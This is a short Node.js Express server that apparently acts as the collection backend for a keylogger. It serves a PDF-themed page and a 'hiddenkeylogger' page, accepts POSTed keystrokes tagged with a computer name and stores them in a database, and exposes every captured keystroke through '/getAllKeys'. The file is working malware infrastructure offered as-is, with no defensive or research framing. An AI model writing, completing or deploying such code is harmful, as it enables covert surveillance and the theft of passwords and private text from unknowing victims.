const express = require("express"),
  app = express(),
  bodyParser = require("body-parser"),
  keyloggerService = require("./services/keyLoggerService");

app.set("view engine", "pug");
app.set("views", "./pug");
app.use(express.static("resources"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.render("pdfpage.pug");
});

app.get("/hiddenkeylogger", (req, res) => {
  res.render("keyloggerpage");
});

app.get("/getAllKeys", (req, res) => {
  keyloggerService.getAllStrokes().then(resp => {
    res.json(resp);
  }).catch(e => {
    res.sendStatus(500);
  });
});

app.post("/sendkeys", (req, res) => {
  // Placeholder for post mapping.
  try {
    const saveObj = {
      computerName: req.body.computerName,
      keystrokes: req.body.keystrokes,
      timestamp: new Date()
    };
    keyloggerService.saveKeystrokes(saveObj);
    res.sendStatus(200);
  } catch(e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/searchKeys", (req, res) => {

});

app.listen(8080, () => {
  keyloggerService.connectDB();
  console.log("server started");
});

//ajdl;kasdflksdf
